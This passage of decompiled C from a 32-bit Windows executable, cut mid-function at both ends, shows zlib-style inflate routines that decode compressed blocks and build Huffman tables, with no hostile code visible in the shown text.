                local_18 = (undefined *)(*(int *)(in_EAX + 0x2c) - (int)puVar7);
              }
              puVar8 = puVar7;
              if (local_18 != (undefined *)0x0) goto LAB_004054d6;
            }
          }
          *(undefined **)(in_EAX + 0x34) = puVar8;
          param_1 = FUN_00404ff9(param_1);
          puVar7 = *(undefined **)(in_EAX + 0x34);
          puVar8 = *(undefined **)(in_EAX + 0x30);
          if (puVar7 < puVar8) {
            local_18 = puVar8 + (-1 - (int)puVar7);
          }
          else {
            local_18 = (undefined *)(*(int *)(in_EAX + 0x2c) - (int)puVar7);
          }
          if ((puVar7 == *(undefined **)(in_EAX + 0x2c)) &&
             (puVar3 = *(undefined **)(in_EAX + 0x28), puVar8 != puVar3)) {
            puVar7 = puVar3;
            if (puVar3 < puVar8) {
              local_18 = puVar8 + (-1 - (int)puVar3);
            }
            else {
              local_18 = (undefined *)(*(int *)(in_EAX + 0x2c) - (int)puVar3);
            }
          }
          if (local_18 == (undefined *)0x0) goto LAB_0040515a;
        }
LAB_004054d6:
        param_1 = 0;
        *puVar7 = *local_20;
        puVar8 = puVar7 + 1;
        local_20 = local_20 + 1;
        local_18 = local_18 + -1;
        if (local_20 == *(undefined **)(in_EAX + 0x2c)) {
          local_20 = *(undefined **)(in_EAX + 0x28);
        }
        puVar2[1] = puVar2[1] - 1;
      }
LAB_00405584:
      *puVar2 = 0;
      goto LAB_00405587;
    case (undefined *)0x405500:
      if (local_18 == (undefined *)0x0) {
        if (puVar8 == *(undefined **)(in_EAX + 0x2c)) {
          local_18 = *(undefined **)(in_EAX + 0x30);
          puVar7 = *(undefined **)(in_EAX + 0x28);
          if (local_18 != puVar7) {
            if (puVar7 < local_18) {
              local_18 = local_18 + (-1 - (int)puVar7);
            }
            else {
              local_18 = *(undefined **)(in_EAX + 0x2c) + -(int)puVar7;
            }
            puVar8 = puVar7;
            if (local_18 != (undefined *)0x0) goto LAB_00405573;
          }
        }
        *(undefined **)(in_EAX + 0x34) = puVar8;
        param_1 = FUN_00404ff9(param_1);
        puVar7 = *(undefined **)(in_EAX + 0x34);
        puVar8 = *(undefined **)(in_EAX + 0x30);
        if (puVar7 < puVar8) {
          local_18 = puVar8 + (-1 - (int)puVar7);
        }
        else {
          local_18 = (undefined *)(*(int *)(in_EAX + 0x2c) - (int)puVar7);
        }
        if ((puVar7 == *(undefined **)(in_EAX + 0x2c)) &&
           (puVar3 = *(undefined **)(in_EAX + 0x28), puVar8 != puVar3)) {
          puVar7 = puVar3;
          if (puVar3 < puVar8) {
            local_18 = puVar8 + (-1 - (int)puVar3);
          }
          else {
            local_18 = (undefined *)(*(int *)(in_EAX + 0x2c) - (int)puVar3);
          }
        }
        if (local_18 == (undefined *)0x0) goto LAB_0040515a;
      }
LAB_00405573:
      param_1 = 0;
      *puVar7 = *(undefined *)(puVar2 + 2);
      puVar8 = puVar7 + 1;
      local_18 = local_18 + -1;
      goto LAB_00405584;
    case (undefined *)0x4055c2:
      goto switchD_0040518a_caseD_4055c2;
    case (undefined *)0x4055d1:
      if (7 < local_8) {
        local_8 = local_8 - 8;
        local_14 = local_14 + 1;
        local_10 = local_10 + -1;
      }
      *(undefined **)(in_EAX + 0x34) = puVar8;
      param_1 = FUN_00404ff9(param_1);
      puVar8 = *(undefined **)(in_EAX + 0x34);
      if (*(undefined **)(in_EAX + 0x30) == puVar8) {
        *puVar2 = 8;
        goto switchD_0040518a_caseD_405624;
      }
      *(uint *)(in_EAX + 0x20) = local_c;
      *(uint *)(in_EAX + 0x1c) = local_8;
      unaff_EBX[1] = local_14;
      pbVar4 = *unaff_EBX;
      *unaff_EBX = local_10;
      unaff_EBX[2] = unaff_EBX[2] + ((int)local_10 - (int)pbVar4);
      goto LAB_00405178;
    case (undefined *)0x405624:
switchD_0040518a_caseD_405624:
      param_1 = 1;
      puVar7 = puVar8;
      goto LAB_0040515a;
    }
  }
  param_1 = -2;
LAB_0040515a:
  *(uint *)(in_EAX + 0x20) = local_c;
  *(uint *)(in_EAX + 0x1c) = local_8;
  unaff_EBX[1] = local_14;
  puVar8 = puVar7;
LAB_0040516c:
  pbVar4 = *unaff_EBX;
  *unaff_EBX = local_10;
  unaff_EBX[2] = unaff_EBX[2] + ((int)local_10 - (int)pbVar4);
LAB_00405178:
  *(undefined **)(in_EAX + 0x34) = puVar8;
  FUN_00404ff9(param_1);
  return;
LAB_0040559a:
  *(uint *)(in_EAX + 0x20) = local_c;
  *(uint *)(in_EAX + 0x1c) = local_8;
  unaff_EBX[1] = (byte *)0x0;
  goto LAB_0040516c;
}



void FUN_00405653(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_004056ae(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 == 0) {
      (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
    }
    else {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 != 0) {
        *puVar1 = 0;
        puVar1[0xb] = iVar2 + unaff_EBX;
        puVar1[0xe] = param_1;
        FUN_00405653();
        return puVar1;
      }
      (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
      (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
    }
  }
  return (undefined4 *)0x0;
}



// WARNING: Type propagation algorithm not settling

void __cdecl FUN_0040572e(uint *param_1,int param_2)

{
  uint *puVar1;
  byte bVar2;
  byte *pbVar3;
  byte **in_EAX;
  undefined4 uVar4;
  uint uVar5;
  byte *pbVar6;
  int iVar7;
  int local_2c;
  int local_28;
  uint local_24;
  uint local_20;
  byte *local_1c;
  byte *local_18;
  byte *local_14;
  byte *local_10;
  uint local_c;
  uint local_8;
  
  local_14 = (byte *)param_1[0xd];
  local_10 = in_EAX[1];
  local_c = param_1[8];
  local_8 = param_1[7];
  if (local_14 < (byte *)param_1[0xc]) {
    local_1c = (byte *)param_1[0xc] + (-1 - (int)local_14);
  }
  else {
    local_1c = (byte *)(param_1[0xb] - (int)local_14);
  }
  uVar5 = *param_1;
  pbVar6 = *in_EAX;
  do {
    local_18 = pbVar6;
    if (9 < uVar5) {
      iVar7 = -2;
LAB_00405776:
      param_1[8] = local_c;
      uVar5 = local_8;
LAB_0040577f:
      param_1[7] = uVar5;
      pbVar6 = local_10;
      param_2 = iVar7;
LAB_00405785:
      in_EAX[1] = pbVar6;
      iVar7 = param_2;
LAB_00405788:
      pbVar6 = *in_EAX;
      *in_EAX = local_18;
      in_EAX[2] = in_EAX[2] + ((int)local_18 - (int)pbVar6);
      param_1[0xd] = (uint)local_14;
LAB_0040579c:
      FUN_00404ff9(iVar7);
      return;
    }
    switch((&switchD_004057aa::switchdataD_00405f06)[uVar5]) {
    case (undefined *)0x4057b1:
      for (; local_8 < 3; local_8 = local_8 + 8) {
        if (local_10 == (byte *)0x0) goto LAB_00405d6e;
        param_2 = 0;
        local_10 = local_10 + -1;
        local_c = local_c | (uint)*local_18 << ((byte)local_8 & 0x1f);
        local_18 = local_18 + 1;
      }
      uVar5 = (local_c & 7) >> 1;
      param_1[6] = local_c & 1;
      if (uVar5 == 0) {
        uVar5 = local_8 - 3 & 7;
        local_c = (local_c >> 3) >> (sbyte)uVar5;
        local_8 = (local_8 - 3) - uVar5;
        *param_1 = 1;
      }
      else if (uVar5 == 1) {
        uVar5 = FUN_004050e2(9,5,&DAT_0041e630,&DAT_0041f630);
        param_1[1] = uVar5;
        if (uVar5 == 0) goto LAB_00405d86;
        local_c = local_c >> 3;
        local_8 = local_8 - 3;
        *param_1 = 6;
      }
      else if (uVar5 == 2) {
        local_c = local_c >> 3;
        local_8 = local_8 - 3;
        *param_1 = 3;
      }
      else if (uVar5 == 3) {
        *param_1 = 9;
        in_EAX[6] = (byte *)s_invalid_block_type_0041fe00;
        param_1[8] = local_c >> 3;
        uVar5 = local_8 - 3;
        iVar7 = -3;
        goto LAB_0040577f;
      }
      break;
    case (undefined *)0x405888:
      for (; local_8 < 0x20; local_8 = local_8 + 8) {
        pbVar6 = (byte *)0x0;
        if (local_10 == (byte *)0x0) {
          param_1[8] = local_c;
          param_1[7] = local_8;
          goto LAB_00405785;
        }
        local_10 = local_10 + -1;
        param_2 = 0;
        local_c = local_c | (uint)*local_18 << ((byte)local_8 & 0x1f);
        local_18 = local_18 + 1;
      }
      if (~local_c >> 0x10 != (local_c & 0xffff)) {
        *param_1 = 9;
        in_EAX[6] = (byte *)s_invalid_stored_block_lengths_0041fe14;
        goto switchD_004057aa_caseD_405dae;
      }
      param_1[1] = local_c & 0xffff;
      local_8 = 0;
      local_c = 0;
      if (param_1[1] == 0) {
LAB_004058e2:
        uVar5 = -(uint)(param_1[6] != 0) & 7;
      }
      else {
        uVar5 = 2;
      }
      *param_1 = uVar5;
      break;
    case (undefined *)0x4058f3:
      if (local_10 != (byte *)0x0) {
        if (local_1c != (byte *)0x0) {
LAB_0040598b:
          param_2 = 0;
          pbVar6 = (byte *)param_1[1];
          if (local_10 < (byte *)param_1[1]) {
            pbVar6 = local_10;
          }
          if (local_1c < pbVar6) {
            pbVar6 = local_1c;
          }
          _memcpy(local_14,local_18,(size_t)pbVar6);
          local_18 = local_18 + (int)pbVar6;
          local_10 = local_10 + -(int)pbVar6;
          local_14 = local_14 + (int)pbVar6;
          local_1c = local_1c + -(int)pbVar6;
          puVar1 = param_1 + 1;
          *puVar1 = *puVar1 - (int)pbVar6;
          if (*puVar1 == 0) goto LAB_004058e2;
          break;
        }
        local_1c = (byte *)0x0;
        if (local_14 == (byte *)param_1[0xb]) {
          pbVar6 = (byte *)param_1[0xc];
          pbVar3 = (byte *)param_1[10];
          if (pbVar3 != pbVar6) {
            if (pbVar3 < pbVar6) {
              local_1c = pbVar6 + (-1 - (int)pbVar3);
            }
            else {
              local_1c = (byte *)param_1[0xb] + -(int)pbVar3;
            }
            local_14 = pbVar3;
            if (local_1c != (byte *)0x0) goto LAB_0040598b;
          }
        }
        param_1[0xd] = (uint)local_14;
        iVar7 = FUN_00404ff9(param_2);
        local_14 = (byte *)param_1[0xd];
        pbVar6 = (byte *)param_1[0xc];
        if (local_14 < pbVar6) {
          local_1c = pbVar6 + (-1 - (int)local_14);
        }
        else {
          local_1c = (byte *)(param_1[0xb] - (int)local_14);
        }
        if (local_14 == (byte *)param_1[0xb]) {
          pbVar3 = (byte *)param_1[10];
          if (pbVar3 != pbVar6) {
            local_14 = pbVar3;
            if (pbVar3 < pbVar6) {
              local_1c = pbVar6 + (-1 - (int)pbVar3);
            }
            else {
              local_1c = (byte *)param_1[0xb] + -(int)pbVar3;
            }
          }
        }
        if (local_1c != (byte *)0x0) goto LAB_0040598b;
        goto LAB_00405db5;
      }
LAB_00405d6e:
      param_1[8] = local_c;
      param_1[7] = local_8;
      in_EAX[1] = (byte *)0x0;
      iVar7 = param_2;
      goto LAB_00405788;
    case (undefined *)0x4059cb:
      for (; pbVar6 = local_18, local_8 < 0xe; local_8 = local_8 + 8) {
        if (local_10 == (byte *)0x0) goto LAB_00405d6e;
        param_2 = 0;
        local_10 = local_10 + -1;
        local_c = local_c | (uint)*local_18 << ((byte)local_8 & 0x1f);
        local_18 = local_18 + 1;
      }
      param_1[1] = local_c & 0x3fff;
      if ((0x1d < (local_c & 0x1f)) || (uVar5 = (local_c & 0x3fff) >> 5 & 0x1f, 0x1d < uVar5)) {
        *param_1 = 9;
        in_EAX[6] = (byte *)s_too_many_length_or_distance_symb_0041fe34;
        goto switchD_004057aa_caseD_405dae;
      }
      uVar5 = (*(code *)in_EAX[8])(in_EAX[10],uVar5 + 0x102 + (local_c & 0x1f),4);
      param_1[3] = uVar5;
      if (uVar5 != 0) {
        local_c = local_c >> 0xe;
        local_8 = local_8 - 0xe;
        param_1[2] = 0;
        *param_1 = 4;
        goto switchD_004057aa_caseD_405aa0;
      }
LAB_00405d86:
      iVar7 = -4;
      goto LAB_00405776;
    case (undefined *)0x405aa0:
switchD_004057aa_caseD_405aa0:
      while (param_1[2] < (param_1[1] >> 10) + 4) {
        for (; local_8 < 3; local_8 = local_8 + 8) {
          if (local_10 == (byte *)0x0) goto LAB_00405d6e;
          param_2 = 0;
          local_10 = local_10 + -1;
          local_c = local_c | (uint)*pbVar6 << ((byte)local_8 & 0x1f);
          pbVar6 = pbVar6 + 1;
          local_18 = pbVar6;
        }
        *(uint *)(param_1[3] + *(int *)(&DAT_0041f730 + param_1[2] * 4) * 4) = local_c & 7;
        param_1[2] = param_1[2] + 1;
        local_8 = local_8 - 3;
        local_c = local_c >> 3;
      }
      while (param_1[2] < 0x13) {
        *(undefined4 *)(param_1[3] + *(int *)(&DAT_0041f730 + param_1[2] * 4) * 4) = 0;
        param_1[2] = param_1[2] + 1;
      }
      param_1[4] = 7;
      iVar7 = FUN_004062be((uint *)param_1[3],(int *)(param_1 + 4),(int *)(param_1 + 5),param_1[9]);
      if (iVar7 == 0) {
        param_1[2] = 0;
        *param_1 = 5;
        pbVar6 = local_18;
        goto switchD_004057aa_caseD_405c27;
      }
      if (iVar7 == -3) {
        (*(code *)in_EAX[9])(in_EAX[10],param_1[3]);
        *param_1 = 9;
      }
      goto LAB_00405776;
    case (undefined *)0x405c27:
switchD_004057aa_caseD_405c27:
      while (param_1[2] < (param_1[1] >> 5 & 0x1f) + 0x102 + (param_1[1] & 0x1f)) {
        for (; local_8 < param_1[4]; local_8 = local_8 + 8) {
          if (local_10 == (byte *)0x0) goto LAB_00405d6e;
          param_2 = 0;
          local_10 = local_10 + -1;
          local_c = local_c | (uint)*pbVar6 << ((byte)local_8 & 0x1f);
          pbVar6 = pbVar6 + 1;
          local_18 = pbVar6;
        }
        iVar7 = param_1[5] + (*(uint *)(&DAT_0041e5e8 + param_1[4] * 4) & local_c) * 8;
        bVar2 = *(byte *)(iVar7 + 1);
        local_20 = (uint)bVar2;
        local_24 = *(uint *)(iVar7 + 4);
        if (local_24 < 0x10) {
          local_c = local_c >> (bVar2 & 0x1f);
          local_8 = local_8 - local_20;
          *(uint *)(param_1[3] + param_1[2] * 4) = local_24;
          param_1[2] = param_1[2] + 1;
        }
        else {
          if (local_24 == 0x12) {
            iVar7 = 7;
          }
          else {
            iVar7 = local_24 - 0xe;
          }
          local_1c = (byte *)((uint)(local_24 == 0x12) * 8 + 3);
          for (; local_8 < iVar7 + local_20; local_8 = local_8 + 8) {
            if (local_10 == (byte *)0x0) goto LAB_00405d6e;
            param_2 = 0;
            local_10 = local_10 + -1;
            local_c = local_c | (uint)*pbVar6 << ((byte)local_8 & 0x1f);
            pbVar6 = pbVar6 + 1;
            local_18 = pbVar6;
          }
          local_c = local_c >> (bVar2 & 0x1f);
          local_1c = local_1c + (*(uint *)(&DAT_0041e5e8 + iVar7 * 4) & local_c);
          local_c = local_c >> ((byte)iVar7 & 0x1f);
          local_8 = local_8 - (iVar7 + local_20);
          uVar5 = param_1[2];
          if ((byte *)((param_1[1] >> 5 & 0x1f) + 0x102 + (param_1[1] & 0x1f)) < local_1c + uVar5) {
LAB_00405e0a:
            (*(code *)in_EAX[9])(in_EAX[10],param_1[3]);
            *param_1 = 9;
            in_EAX[6] = (byte *)s_invalid_bit_length_repeat_0041fe58;
            param_1[8] = local_c;
            param_1[7] = local_8;
            in_EAX[1] = local_10;
            pbVar6 = *in_EAX;
            *in_EAX = local_18;
            in_EAX[2] = in_EAX[2] + ((int)local_18 - (int)pbVar6);
            param_1[0xd] = (uint)local_14;
            FUN_00404ff9(-3);
            return;
          }
          if (local_24 == 0x10) {
            if (uVar5 == 0) goto LAB_00405e0a;
            uVar4 = *(undefined4 *)((param_1[3] - 4) + uVar5 * 4);
          }
          else {
            uVar4 = 0;
          }
          do {
            *(undefined4 *)(param_1[3] + uVar5 * 4) = uVar4;
            uVar5 = uVar5 + 1;
            local_1c = local_1c + -1;
          } while (local_1c != (byte *)0x0);
          param_1[2] = uVar5;
          local_1c = (byte *)0x0;
        }
      }
      param_1[5] = 0;
      local_1c = (byte *)0x9;
      local_20 = 6;
      iVar7 = FUN_0040633a((param_1[1] >> 5 & 0x1f) + 1,(int *)&local_1c,(int *)&local_20,&local_2c,
                           &local_28,param_1[9]);
      if (iVar7 != 0) {
        if (iVar7 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],param_1[3]);
          *param_1 = 9;
        }
        param_1[8] = local_c;
        param_1[7] = local_8;
        in_EAX[1] = local_10;
        pbVar6 = *in_EAX;
        *in_EAX = local_18;
        in_EAX[2] = in_EAX[2] + ((int)local_18 - (int)pbVar6);
        param_1[0xd] = (uint)local_14;
        goto LAB_0040579c;
      }
      uVar5 = FUN_004050e2((char)local_1c,(char)local_20,local_2c,local_28);
      if (uVar5 == 0) {
        param_1[8] = local_c;
        param_1[7] = local_8;
        in_EAX[1] = local_10;
        pbVar6 = *in_EAX;
        *in_EAX = local_18;
        in_EAX[2] = in_EAX[2] + ((int)local_18 - (int)pbVar6);
        param_1[0xd] = (uint)local_14;
        iVar7 = -4;
        goto LAB_0040579c;
      }
      param_1[1] = uVar5;
      (*(code *)in_EAX[9])(in_EAX[10],param_1[3]);
      *param_1 = 6;
switchD_004057aa_caseD_405cd6:
      param_1[8] = local_c;
      param_1[7] = local_8;
      in_EAX[1] = local_10;
      pbVar6 = *in_EAX;
      *in_EAX = local_18;
      in_EAX[2] = in_EAX[2] + ((int)local_18 - (int)pbVar6);
      param_1[0xd] = (uint)local_14;
      iVar7 = FUN_00405113(param_2);
      if (iVar7 != 1) goto LAB_0040579c;
      param_2 = 0;
      (*(code *)in_EAX[9])(in_EAX[10],param_1[1]);
      local_18 = *in_EAX;
      local_10 = in_EAX[1];
      local_c = param_1[8];
      local_8 = param_1[7];
      local_14 = (byte *)param_1[0xd];
      if (local_14 < (byte *)param_1[0xc]) {
        local_1c = (byte *)param_1[0xc] + (-1 - (int)local_14);
      }
      else {
        local_1c = (byte *)(param_1[0xb] - (int)local_14);
      }
      if (param_1[6] != 0) {
        *param_1 = 7;
switchD_004057aa_caseD_405ed9:
        param_1[0xd] = (uint)local_14;
        iVar7 = FUN_00404ff9(param_2);
        local_14 = (byte *)param_1[0xd];
        if ((byte *)param_1[0xc] != local_14) {
LAB_00405db5:
          param_1[8] = local_c;
          param_1[7] = local_8;
          in_EAX[1] = local_10;
          pbVar6 = *in_EAX;
          *in_EAX = local_18;
          in_EAX[2] = in_EAX[2] + ((int)local_18 - (int)pbVar6);
          param_1[0xd] = (uint)local_14;
          goto LAB_0040579c;
        }
        *param_1 = 8;
switchD_004057aa_caseD_405eff:
        iVar7 = 1;
        goto LAB_00405776;
      }
      *param_1 = 0;
      break;
    case (undefined *)0x405cd6:
      goto switchD_004057aa_caseD_405cd6;
    case (undefined *)0x405dae:
switchD_004057aa_caseD_405dae:
      iVar7 = -3;
      goto LAB_00405776;
    case (undefined *)0x405ed9:
      goto switchD_004057aa_caseD_405ed9;
    case (undefined *)0x405eff:
      goto switchD_004057aa_caseD_405eff;
    }
    uVar5 = *param_1;
    pbVar6 = local_18;
  } while( true );
}



undefined4 __cdecl
FUN_00405f2e(uint *param_1,uint param_2,uint param_3,int param_4,int param_5,int *param_6,
            int param_7,uint *param_8,uint *param_9)

{
  undefined4 uVar1;
  uint *in_EAX;
  int iVar2;
  uint uVar3;
  uint *puVar4;
  int iVar5;
  uint uVar6;
  undefined4 *puVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  byte bVar11;
  int iVar12;
  int local_100 [15];
  uint local_c4 [16];
  uint local_84 [17];
  int local_40;
  int local_3c;
  int local_38;
  int local_34;
  uint local_30;
  int local_2c;
  uint *local_28;
  uint local_24;
  uint local_20;
  undefined4 local_1c;
  uint local_18;
  uint local_14;
  int local_10;
  uint local_c;
  uint local_8;
  
  local_84[0] = 0;
  local_84[1] = 0;
  local_84[2] = 0;
  local_84[3] = 0;
  local_84[4] = 0;
  local_84[5] = 0;
  local_84[6] = 0;
  local_84[7] = 0;
  local_84[8] = 0;
  local_84[9] = 0;
  local_84[10] = 0;
  local_84[11] = 0;
  local_84[12] = 0;
  local_84[13] = 0;
  local_84[14] = 0;
  local_84[15] = 0;
  puVar4 = param_1;
  uVar8 = param_2;
  do {
    local_84[*puVar4] = local_84[*puVar4] + 1;
    puVar4 = puVar4 + 1;
    uVar8 = uVar8 - 1;
  } while (uVar8 != 0);
  if (local_84[0] == param_2) {
    *param_6 = 0;
    *in_EAX = 0;
  }
  else {
    uVar9 = 1;
    local_8 = *in_EAX;
    uVar8 = 0xf;
    do {
      if (local_84[uVar9] != 0) break;
      uVar9 = uVar9 + 1;
    } while (uVar9 < 0x10);
    local_c = uVar9;
    if (*in_EAX < uVar9) {
      local_8 = uVar9;
    }
    do {
      if (local_84[uVar8] != 0) break;
      uVar8 = uVar8 - 1;
    } while (uVar8 != 0);
    local_30 = uVar8;
    if (uVar8 < local_8) {
      local_8 = uVar8;
    }
    *in_EAX = local_8;
    iVar10 = 1 << ((byte)uVar9 & 0x1f);
    for (; uVar9 < uVar8; uVar9 = uVar9 + 1) {
      if ((int)(iVar10 - local_84[uVar9]) < 0) {
        return 0xfffffffd;
      }
      iVar10 = (iVar10 - local_84[uVar9]) * 2;
    }
    uVar9 = local_84[uVar8];
    iVar10 = iVar10 - uVar9;
    local_38 = iVar10;
    if (iVar10 < 0) {
      return 0xfffffffd;
    }
    local_84[uVar8] = uVar9 + iVar10;
    iVar2 = 0;
    iVar12 = uVar8 - 1;
    local_c4[1] = 0;
    if (iVar12 != 0) {
      iVar5 = 0;
      do {
        iVar2 = iVar2 + *(int *)((int)local_84 + iVar5 + 4);
        iVar12 = iVar12 + -1;
        *(int *)((int)local_c4 + iVar5 + 8) = iVar2;
        iVar5 = iVar5 + 4;
      } while (iVar12 != 0);
    }
    uVar9 = 0;
    do {
      iVar2 = local_38;
      uVar6 = *param_1;
      param_1 = param_1 + 1;
      if (uVar6 != 0) {
        uVar3 = local_c4[uVar6];
        param_9[uVar3] = uVar9;
        local_c4[uVar6] = uVar3 + 1;
        iVar10 = iVar2;
      }
      uVar9 = uVar9 + 1;
    } while (uVar9 < param_2);
    uVar8 = local_c4[uVar8];
    local_10 = -1;
    param_1 = param_9;
    iVar2 = -local_8;
    local_24 = 0;
    local_c4[0] = 0;
    local_100[0] = 0;
    local_2c = 0;
    local_14 = 0;
    if ((int)local_c <= (int)local_30) {
      local_34 = local_c - 1;
      local_28 = local_84 + local_c;
      do {
        local_20 = *local_28;
        uVar1 = local_1c;
        while (local_1c = uVar1, local_20 != 0) {
          local_1c._2_2_ = (undefined2)((uint)uVar1 >> 0x10);
          local_20 = local_20 - 1;
          local_3c = local_8 + iVar2;
          if (local_3c < (int)local_c) {
            local_40 = iVar2 - local_8;
            do {
              iVar10 = local_10;
              local_10 = local_10 + 1;
              iVar2 = iVar2 + local_8;
              local_40 = local_40 + local_8;
              local_3c = local_3c + local_8;
              uVar9 = local_30 - iVar2;
              if (local_8 < local_30 - iVar2) {
                uVar9 = local_8;
              }
              uVar6 = local_c - iVar2;
              uVar3 = 1 << ((byte)uVar6 & 0x1f);
              if ((local_20 + 1 < uVar3) &&
                 (iVar12 = uVar3 + (-1 - local_20), puVar4 = local_28, uVar6 < uVar9)) {
                while (uVar6 = uVar6 + 1, uVar6 < uVar9) {
                  uVar3 = puVar4[1];
                  if ((uint)(iVar12 * 2) <= uVar3) break;
                  iVar12 = iVar12 * 2 - uVar3;
                  puVar4 = puVar4 + 1;
                }
              }
              local_14 = 1 << ((byte)uVar6 & 0x1f);
              uVar9 = *param_8 + local_14;
              if (0x5a0 < uVar9) {
                return 0xfffffffd;
              }
              local_2c = param_7 + *param_8 * 8;
              local_100[local_10] = local_2c;
              uVar3 = local_24;
              *param_8 = uVar9;
              if (local_10 == 0) {
                *param_6 = local_2c;
              }
              else {
                local_c4[local_10] = local_24;
                local_1c = CONCAT31(CONCAT21(local_1c._2_2_,(undefined)local_8),(byte)uVar6);
                uVar3 = uVar3 >> ((byte)local_40 & 0x1f);
                iVar10 = local_100[iVar10];
                local_18 = (local_2c - iVar10 >> 3) - uVar3;
                *(undefined4 *)(iVar10 + uVar3 * 8) = local_1c;
                *(uint *)(iVar10 + 4 + uVar3 * 8) = local_18;
              }
              iVar10 = local_38;
            } while (local_3c < (int)local_c);
          }
          bVar11 = (byte)iVar2;
          if (param_1 < param_9 + uVar8) {
            local_18 = *param_1;
            if (local_18 < param_3) {
              local_1c._0_1_ = (local_18 < 0x100) - 1U & 0x60;
            }
            else {
              iVar12 = (local_18 - param_3) * 4;
              local_1c._0_1_ = *(char *)(iVar12 + param_5) + 0x50;
              local_18 = *(uint *)(iVar12 + param_4);
            }
            param_1 = param_1 + 1;
          }
          else {
            local_1c._0_1_ = 0xc0;
          }
          local_1c = CONCAT31(CONCAT21(local_1c._2_2_,(char)local_c - bVar11),(byte)local_1c);
          iVar12 = 1 << ((char)local_c - bVar11 & 0x1f);
          uVar9 = local_24 >> (bVar11 & 0x1f);
          if (uVar9 < local_14) {
            puVar7 = (undefined4 *)(local_2c + uVar9 * 8);
            do {
              *puVar7 = local_1c;
              puVar7[1] = local_18;
              uVar9 = uVar9 + iVar12;
              puVar7 = puVar7 + iVar12 * 2;
              iVar10 = local_38;
            } while (uVar9 < local_14);
          }
          uVar9 = 1 << ((byte)local_34 & 0x1f);
          while ((local_24 & uVar9) != 0) {
            local_24 = local_24 ^ uVar9;
            uVar9 = uVar9 >> 1;
          }
          local_24 = local_24 ^ uVar9;
          uVar1 = local_1c;
          if (((1 << (bVar11 & 0x1f)) - 1U & local_24) != local_c4[local_10]) {
            do {
              iVar2 = iVar2 - local_8;
              local_10 = local_10 + -1;
            } while (((1 << ((byte)iVar2 & 0x1f)) - 1U & local_24) != local_c4[local_10]);
          }
        }
        local_c = local_c + 1;
        local_28 = local_28 + 1;
        local_34 = local_34 + 1;
      } while ((int)local_c <= (int)local_30);
    }
    if ((iVar10 != 0) && (local_30 != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



int __cdecl FUN_004062be(uint *param_1,int *param_2,int *param_3,int param_4)

{
  uint *puVar1;
  int iVar2;
  int unaff_ESI;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(unaff_ESI + 0x20))(*(undefined4 *)(unaff_ESI + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    iVar2 = -4;
  }
  else {
    iVar2 = FUN_00405f2e(param_1,0x13,0x13,0,0,param_3,param_4,&local_8,puVar1);
    if (iVar2 == -3) {
      *(char **)(unaff_ESI + 0x18) = s_oversubscribed_dynamic_bit_lengt_0041fe74;
    }
    else if ((iVar2 == -5) || (*param_2 == 0)) {
      *(char **)(unaff_ESI + 0x18) = s_incomplete_dynamic_bit_lengths_t_0041fe9c;
      iVar2 = -3;
    }
    (**(code **)(unaff_ESI + 0x24))(*(undefined4 *)(unaff_ESI + 0x28),puVar1);
  }
  return iVar2;
}



int __cdecl
FUN_0040633a(uint param_1,int *param_2,int *param_3,int *param_4,int *param_5,int param_6)

{
  uint *in_EAX;
  int iVar1;
  uint unaff_EBX;
  int unaff_ESI;
  int local_10;
  uint local_c;
  uint *local_8;
  
  local_c = 0;
  local_8 = (uint *)(**(code **)(unaff_ESI + 0x20))(*(undefined4 *)(unaff_ESI + 0x28),0x120,4);
  if (local_8 == (uint *)0x0) {
    return -4;
  }
  local_10 = FUN_00405f2e(in_EAX,unaff_EBX,0x101,0x41f7b0,0x41f830,param_4,param_6,&local_c,local_8)
  ;
  if (local_10 == 0) {
    if (*param_2 != 0) {
      iVar1 = FUN_00405f2e(in_EAX + unaff_EBX,param_1,0,0x41f8b0,0x41f928,param_5,param_6,&local_c,
                           local_8);
      if (iVar1 == 0) {
        if ((*param_3 != 0) || (unaff_EBX < 0x102)) {
          (**(code **)(unaff_ESI + 0x24))(*(undefined4 *)(unaff_ESI + 0x28),local_8);
          return 0;
        }
      }
      else {
        if (iVar1 == -3) {
          *(char **)(unaff_ESI + 0x18) = s_oversubscribed_distance_tree_0041ff04;
          goto LAB_00406420;
        }
        if (iVar1 == -5) {
          *(char **)(unaff_ESI + 0x18) = s_incomplete_distance_tree_0041ff24;
          iVar1 = -3;
          goto LAB_00406420;
        }
        if (iVar1 == -4) goto LAB_00406420;
      }
      *(char **)(unaff_ESI + 0x18) = s_empty_distance_tree_with_lengths_0041ff40;
      iVar1 = -3;
LAB_00406420:
